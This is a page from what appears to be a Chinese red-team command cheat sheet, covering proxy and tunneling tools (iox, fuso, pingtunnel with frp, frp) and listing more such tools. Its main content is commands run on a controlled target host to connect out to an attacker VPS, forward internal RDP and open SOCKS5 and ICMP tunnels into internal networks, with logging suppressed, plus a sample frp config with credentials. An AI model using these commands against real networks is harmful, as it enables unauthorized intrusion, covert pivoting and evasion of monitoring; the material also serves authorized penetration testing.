@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!--
+    The page_title contains the title for a page as shown in the navigation.
+    Site name contains the name as defined in the mkdocs.yml
+  -->
+  <title>proxy tools - 红队命令速查</title>
+
+  <!-- Page description -->
+  
+
+  <!-- Redirect -->
+  
+
+  <!-- Page author -->
+  
+  <!--
+    Just add a favicon.ico image to the docs.
+  -->
+  <link rel="shortcut icon" href="../../img/favicon.ico">
+
+  <link rel="stylesheet" href="../../css/colors.css">
+  <link rel="stylesheet" href="../../css/bundle.css">
+  <link rel="stylesheet" href="../../css/theme.css">
+  <link media="print" onload="this.media='all'" rel="stylesheet" href="../../css/atom-dark-one.min.css">
+  <!--
+    extra_ess contains paths to CSS files in the users
+    documentation directory or a list of CSS files defined in
+    their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_css
+  -->
+  
+
+  
+  
+
+  <!--
+    Include Google Analytics tracking code.
+
+    http://www.mkdocs.org/user-guide/configuration/#google_analytics
+  -->
+  
+
+</head>
+
+<body>
+<input id="dark-mode" type="checkbox" />
+<!--
+  The JS has to be loaded here for maximum performance, right after the #dark-mode
+-->
+<script src="../../js/theme.js"></script>
+<div class="app-body">
+  <!-- KPN STYLE Beginning -->
+  <div class="app-layout ">
+    <!-- Top Bar -->
+    <nav class="app-layout__top-bar top-bar">
+      <a class="top-bar__logo" href="https://forum.ywhack.com/command/">
+        <img alt="KPN Logo" src="../../img/logo.svg" />
+      </a>
+      <div class="top-bar__title">红队命令速查</div>
+      <ul class="top-bar__menu">
+        <!--
+          Create a search form that sends the user to the search.html file - this is
+          the other file in the template which adds search to the theme. The only
+          requirement here is that there is a text input with the name 'q' and the
+          action and methods match below.
+        -->
+          <li class="top-bar__item">
+
+            <span role="search" id="search-input-wrapper">
+              <form action="../../search.html" method="get">
+                <input type="text" class="input" id="search-input" name="q" placeholder="Search..." />
+              </form>
+            </span >
+          </li>
+        <!--
+          Versioning support
+        -->
+        
+        <!--
+          Support repo URL
+        -->
+        <li class="top-bar__item">
+          
+        </li>
+
+        <li class="top-bar__item">
+            <label class="top-bar__link" id="label-dark-mode" for="dark-mode" title="Dark mode">
+              <svg alt="dark mode" width="24" height="24">
+                <image xlink:href="../../img/ui-bulb.svg" width="24" height="24"/>
+            </svg>
+            </label>
+        </li>
+        <li class="top-bar__item top-bar__item--trigger"></li>
+
+        <!-- <li class="top-bar__item">
+
+          <a class="top-bar__link top-bar__link--active">Home</a>
+        </li>
+        <li class="top-bar__item"><a class="top-bar__link">Information</a></li>
+        <li class="top-bar__item">
+          <a class="top-bar__link top-bar__link--collapsed">Getting Started</a>
+
+        </li>
+        <li class="top-bar__item top-bar__item--trigger">Menu</li> -->
+      </ul>
+    </nav>
+
+    <!--
+      Create the navigation for the documentation.
+
+      Because we don't know how many levels deep the navigation is, it needs to
+      be included in it's own file so it can be recursive. Otherwise the theme
+      can also only support a specific number of levels.
+
+      See the nav.html file for more details about how this works.
+    -->
+    <nav class="app-layout__side-bar side-bar">
+      <div class="side-bar__action-bar">
+        <a class="side-bar__link" href="/">红队命令速查</a>
+        <!--
+          Versioning support
+        -->
+        
+        <button class="side-bar__close"></button>
+      </div>
+      <ul class="side-bar__menu">
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../.." class="side-bar__link ">
+    介绍
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../../Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
+    Linux 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../../Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
+    Windows 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded side-bar__link--active">
+      工具使用命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../mimikatz/" class="side-bar__link ">
+    mimikatz
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="./" class="side-bar__link side-bar__link--active">
+    proxy tools
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/" class="side-bar__link ">
+    后渗透工具列表
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded">
+      数据库命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/" class="side-bar__link ">
+    oracle
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/" class="side-bar__link ">
+    mysql
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/" class="side-bar__link ">
+    sql server
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../../%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/" class="side-bar__link ">
+    postgresql
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+      </ul>
+    </nav>
+
+    <!-- MAIN BLOCK -->
+    <main class="app-layout__main main">
+      <div class="app-layout__title-bar title-bar">
+        <div class="title-bar__title" style="font-size: 12px;">proxy tools</div>
+      </div>
+      
+      <div class="sidebar--secondary hidden-s hidden-xs">
+        <h4>Table of contents</h4>
+        <ul>
+        
+          
+            
+                <li><a class="a" href="#iox">iox</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#proxy">proxy</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#fwd">fwd</a></li>
+                
+            
+                <li><a class="a" href="#fuso">fuso</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#socks">socks</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#readme">readme</a></li>
+                
+            
+                <li><a class="a" href="#pingtunnelfrp-icmp">pingtunnel+frp 搭 icmp 隧道</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#_1">被控机</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#vps">VPS</a></li>
+                
+            
+                <li><a class="a" href="#frp">FRP</a></li>
+                
+            
+                <li><a class="a" href="#_2">代理工具列表</a></li>
+                
+            
+          
+        
+        </ul>
+      </div>
+      
+      <div class="container content-block">
+        <div class="kpn-style">
+          <div class="card">
+            <div class="card__body">
+
+              
+              <h1 id="proxy-tools">proxy tools</h1>
+<h2 id="iox">iox</h2>
+<p>下载地址：https://github.com/EddieIvan01/iox</p>
+<h3 id="proxy">proxy</h3>
+<blockquote>
+<p>在本地 0.0.0.0:1080启动Socks5服务</p>
+</blockquote>
+<pre><code>./iox proxy -l 1080
+</code></pre>
+<blockquote>
+<p>加密转发 socks5 代理：</p>
+</blockquote>
+<pre><code>VPS 监听(//将1080端口监听到的流量转发至50054端口):
+nohup ./iox proxy -l 50054 -l 1081 -k 3211 &gt; iox.log &amp;  
+
+在目标主机执行(//启动代理服务并发送至VPS 50054端口)：
+./iox proxy -r VPSIP:50054 -k 3211  
+
+然后本地socks5代理：socks5://vps:1081
+</code></pre>
+<h3 id="fwd">fwd</h3>
+<blockquote>
+<p>本地端口转发 3389 至VPS:</p>
+</blockquote>
+<pre><code>vps执行:
+nohup ./iox fwd -l *8888 -l 33890 -k 22222
+
+目标机器执行:
+iox.exe fwd -r 192.168.0.1:3389 -r *VPSIP:8888 -k 22222
+
+随后连接 VPS:33890 即可访问内网 3389
+</code></pre>
+<h2 id="fuso">fuso</h2>
+<p>Github：https://github.com/editso/fuso</p>
+<h3 id="socks">socks</h3>
+<pre><code>VPS：
+./fus
+
+//被控机
+./fuc.exe VPSIP 6722 --socks
+</code></pre>
+<ul>
+<li>linux：i686-unknown-linux-musl.zip</li>
+<li>windows：x86_64-pc-windows-msvc.zip</li>
+</ul>
+<h3 id="readme">readme</h3>
+<pre><code>1. 端口转发
+fuc --forward-host xxx.xxx.xxx.xxx --forward-port
+   --forward-host: 转发到的地址
+   --forward-port: 转发到的端口
+   如: 转发流量到内网 10.10.10.4:3389
+   &gt; fuc --forward-host 10.10.10.4 --forward-port 3389
+
+2. socks5:
+fuc --socks --su --s5p xxx --s5u xxx
+   --su: 可选的, 开启udp转发, 
+   --s5p: 可选的, 认证密码, 默认不进行密码认证
+   --s5u 可选的, 认证账号, 默认账号 anonymous
+   --socks: 可选的, 开启socks5代理, 未指定--su的情况下不会转发udp
+   如: 开启udp转发与密码认证
+   &gt; fuc --socks --su --s5p 123 --s5u socks
+   此时, 已开启udp转发,连接密码为 &quot;123&quot;,账号为 &quot;socks&quot;
+
+3. 指定穿透成功时访问的端口
+   fuc -b xxxx
+   -b | --visit-bind-port: 可选的, 默认随机分配
+   如: 访问外网端口 8888 转发到内网 80
+   &gt; fuc --forward-port 80 -b 8888
+
+4. 桥接模式 注意: 目前不能转发udp
+   fuc --bridge-listen xxxx --bridge-port xxx 
+   --bridge-listen | --bl: 监听地址, 默认 127.0.0.1
+   --bridge-port | --bp: 监听端口, 默认不启用桥接
+   如: 开始桥接模式,并监听在9999端口, 本机ip地址为: 10.10.10.2
+   &gt; fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 开启桥接
+   &gt; fuc 10.10.10.2 9999 # 建立连接
+
+   级联: 
+   &gt; fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 第一级, IP: 10.10.10.2
+    &gt; fuc --bridge-listen 0.0.0.0 --bridge-port 9991  10.10.10.2 9999 # 第二级, IP: 10.10.10.3
+     &gt; fuc 10.10.10.3 9991 # 最终 
+
+5. 将连接信息通知到 Telegram 或其他
+   fus --observer &quot;program:[arguments]&quot;
+   --observer: 建立连接或断开连接时的钩子
+   如: 使用bash脚本将连接信息通知到tg
+   &gt; fus --observer &quot;/bin/bash:[telegram.sh]&quot;
+
+6. 指定客户端与服务端通信的端口
+   fuc --channel-port 8888 ...
+   --channel-port: 可选的, 客户端与服务端通信端口, 默认随机
+</code></pre>
+<h2 id="pingtunnelfrp-icmp">pingtunnel+frp 搭 icmp 隧道</h2>
+<p>pingtunnel 下载：https://oss.ywhack.com/%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/pingtunnel-2.6</p>
+<h3 id="_1">被控机</h3>
+<pre><code class="language-bash">nohup ./pingtunnel -type client -l 127.0.0.1:9999 -s vpsip -t vpsip:10000 -sock5 -1 -noprint 1 -nolog 1 &gt;p.log &amp;
+nohup ./frpc -c frpc.ini &gt; fff.log &amp;
+</code></pre>
+<p>pingtunnel -l 监听本地的9999端口 -s vps主机IP  -t vps主机frp服务端口</p>
+<p>客户端frp配置：</p>
+<pre><code class="language-ini">[common]
+server_addr = 127.0.0.1
+server_port = 10000
+token = PassW0Rd
+
+[zhaoshangju_10078]
+type = tcp
+remote_port = 10015
+plugin = socks5
+plugin_user = thIsuserAS
+plugin_passwd = Passweqwe0Rm
+use_encryption = true
+</code></pre>
+<h3 id="vps">VPS</h3>
+<pre><code class="language-bash">./pingtunnel -type server
+./frps -c frps.ini
+</code></pre>
+<p>本地代理vps的 10015 端口加上密码即可使用icmp隧道。</p>
+<p>参考文章：https://www.cnblogs.com/cute-puli/p/15213394.html</p>
+<h2 id="frp">FRP</h2>
+<ul>
+<li>将 frps 及 frps.ini 放到具有公网 IP 的机器上。</li>
+<li>
+<p>将 frpc 及 frpc.ini 放到处于内网环境的机器上。</p>
+</li>
+<li>
+<p>客户端：frpc -c frpc.ini</p>
+</li>
+<li>服务端：frps -c frps.ini</li>
+</ul>
+<p>Github:https://github.com/fatedier/frp</p>
+<h2 id="_2">代理工具列表</h2>
+<ul>
+<li>[2021.03.07] - <a href="https://www.proxifier.com/">proxifier 全平台代理工具，支持多种socks协议</a></li>
+<li>[2021.03.07] - <a href="https://github.com/fatedier/frp">frp 专注于内网穿透的高性能的反向代理应用</a></li>
+<li>[2021.03.07] - <a href="https://github.com/ehang-io/nps">nps 轻量级、高性能、功能强大的内网穿透代理服务器</a></li>
+<li>[2021.03.07] - <a href="https://github.com/EddieIvan01/iox">iox 端口转发 &amp; 内网代理工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/ph4ntonn/Stowaway">Stowaway 面向渗透测试人员的多级代理工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/rapiz1/rathole">rathole Rust 编写的安全、稳定、高性能的内网穿透工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/b23r0/rsocx">rsocx 一款高性能的支持绑定/反向代理的 Socks5 工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/Mob2003/rakshasa">rakshasa 基于go编写的跨平台、稳定、隐秘的多级代理内网穿透工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/FelisCatus/SwitchyOmega">SwitchyOmega 浏览器的代理插件</a></li>
+<li>[2021.03.07] - <a href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg 改进的reGeorg版本</a></li>
+<li>[2021.03.07] - <a href="https://github.com/alex-sector/dns2tcp">dns2tcp是一款利用dns协议传输tcp数据的工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/iagox86/dnscat2">dnscat2 是一个DNS隧道工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/nccgroup/ABPTTS">ABPTTS 基于ssl加密的http隧道工具</a></li>
+<li>[2021.03.07] - <a href="http://rootkiter.com/Termite/">Termite 内网渗透代理、端口转发工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/FQrabbit/SSTap-Rule">SSTap, 一款利用虚拟网卡在网络层实现的代理工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/idlefire/ew">ew 用于开启 SOCKS v5 代理服务的工具(跨平台)</a></li>
+<li>[2021.03.07] - <a href="https://github.com/ntop/n2n">n2n 开源的点对点穿透工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/CTF-MissFeng/Ecloud">Ecloud 一款基于http/1.1协议传输TCP流量的工具</a></li>
+<li>[2021.03.07] - <a href="https://github.com/inquisb/icmpsh">icmpsh 一个简单的 reverse ICMP shell</a></li>
+<li>[2021.03.08] - <a href="https://github.com/inconshreveable/ngrok">ngrok 正/反向代理，内网穿透，端口转发</a></li>
+<li>[2021.03.08] - <a href="https://securesocketfunneling.github.io/ssf/">ssf 全平台的加密隧道 端口转发工具</a></li>
+<li>[2021.03.14] - <a href="https://github.com/haad/proxychains">proxychains 命令行代理神器</a></li>
+<li>[2021.03.14] - <a href="https://github.com/crabkun/switcher">switcher 一个多功能的端口转发/端口复用工具</a></li>
+<li>[2021.03.22] - <a href="https://github.com/esrrhs/pingtunnel">pingtunnel 是把 tcp/udp/sock5 流量伪装成 icmp 流量进行转发的工具</a></li>
+<li>[2021.03.26] - <a href="https://github.com/jpillora/chisel">chisel - 一款快速稳定的隧道工具</a></li>
+<li>[2021.03.29] - <a href="https://github.com/FunnyWolf/pystinger">pystinger - 一款使用webshell进行流量转发的出网工具</a></li>
+<li>[2021.03.29] - <a href="https://github.com/blackarrowsec/pivotnacci">pivotnacci - 通过HTTP代理建立socks连接的工具</a></li>
+<li>[2021.04.06] - <a href="https://github.com/ffay/lanproxy">lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具</a></li>
+<li>[2021.04.14] - <a href="https://github.com/Dliv3/Venom">Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</a></li>
+<li>[2021.05.07] - <a href="https://github.com/snail007/goproxy">goproxy 一款轻量级、功能强大、高性能的多种代理工具</a></li>
+<li>[2021.05.07] - <a href="https://github.com/shimmeris/SCFProxy">SCFProxy 一个基于腾讯云函数服务的免费代理池</a></li>
+<li>[2021.06.21] - <a href="https://github.com/mosn/mosn">MOSN 是边缘或服务网格的云原生代理。</a></li>
+<li>[2021.06.23] - <a href="https://github.com/Daybr4ak/C2ReverseProxy">C2ReverseProxy 一款可以在不出网的环境下进行反向代理及cs上线的工具</a></li>
+</ul>
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="footer__body">
+        
+        <div class="row">
+          <div class="col col--s-4 col--m-3 col--l-2">
+          </div>
+          <div class="col col--s-4 col--m space-between">
+            
+              <a class="footer__link padding-top-0 navigation-prev"
+                href="../mimikatz/"
+                title="mimikatz">
+                &#8592; Previous Page
+              </a>
+            
+            
+            
+              <a class="footer__link padding-top-0 navigation-next"
+                href="../%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/"
+                title="后渗透工具列表"/>
+                Next Page &#8594;
+              </a>
+            
+          </div>
+          <div class="col col--s-4 col--m-3 ">
+          </div>
+        </div>
+        
+      </div>
+    </footer>
+  </div>
+
+
+  <!--
+  MkDocs version      : 1.5.3
+  Docs Build Date UTC : 2024-07-11 13:53:22.951773+00:00
+  -->
+
+  <!--
+    To include static assets from our theme, just add
+    ../.. beforehand which will be the relative path to
+    the root of the documentation.
+  -->
+  <script src="../../js/highlight.min.js"></script>
+  <script src="../../js/languages/groovy.min.js"></script>
+  <script src="../../js/languages/asciidoc.min.js"></script>
+  <script src="../../js/languages/nix.min.js"></script>
+
+  <script>
+    hljs.highlightAll();
+  </script>
+  <script async src="../../js/detail.js"></script>
+  <!--
+    extra_javascript contains paths to JavaScript files in the
+    users documentation directory or a list of JavaScript files
+    defined in their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_javascript
+  -->
+  
+    <script src="../../search/main.js"></script>
+  
+
+
+  <script>
+  function getMermaidTheme() {
+    if (document.getElementById("dark-mode").checked) {
+      return 'dark'
+    }
+    return 'forest'
+  }
+
+  function initMermaid() {
+    mermaid.initialize({
+      theme: getMermaidTheme(),
+      logLevel: 1,
+    });
+  }
+  var mermaidClass = document.getElementsByClassName('mermaid');
+  if (mermaidClass.length > 0) {
+
+    var mermaidScript = document.createElement('script');
+    mermaidScript.setAttribute("src", "../../js/mermaid.min.js");
+    mermaidScript.setAttribute("async", "false");
+    mermaidScript.setAttribute("type", "text/javascript");
+    mermaidScript.onload = initMermaid;
+    document.body.appendChild(mermaidScript)
+
+  }
+  </script>
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?6c97fbf63dd98317dba802ddddaad905";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+  </script>
+  
+</div>
+</body>
+</html>
